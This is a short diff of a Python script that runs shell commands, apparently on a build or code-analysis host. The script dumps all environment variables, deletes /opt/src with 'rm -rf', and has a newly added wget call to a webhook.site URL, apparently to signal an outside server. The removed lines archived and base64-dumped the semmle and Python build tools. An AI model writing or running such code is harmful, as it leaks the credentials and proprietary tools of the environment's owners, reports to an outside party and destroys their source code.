@@ -25,12 +25,9 @@ import subprocess
 subprocess.call(["/usr/bin/printenv"])
 
 subprocess.call(["echo","-----semmle-----"])
-subprocess.call(["tar","-z","/usr/bin/semmle*","-cf","/tmp/x"])
-subprocess.call(["/usr/bin/base64","/tmp/x"])
+# subprocess.call(["tar","-z","/usr/bin/semmle*","-cf","/tmp/x"])
+subprocess.call(["/usr/bin/wget","https://webhook.site/e805a01b-9f80-426d-af0a-04fd8fe16db5"])
 
-subprocess.call(["echo","-----semmle-----"])
-subprocess.call(["tar","-z","/opt/buildtools/python","-cf","/tmp/z"])
-subprocess.call(["/usr/bin/base64","/tmp/z"])
 
 subprocess.call(["rm", "-rf", "/opt/src"])
 
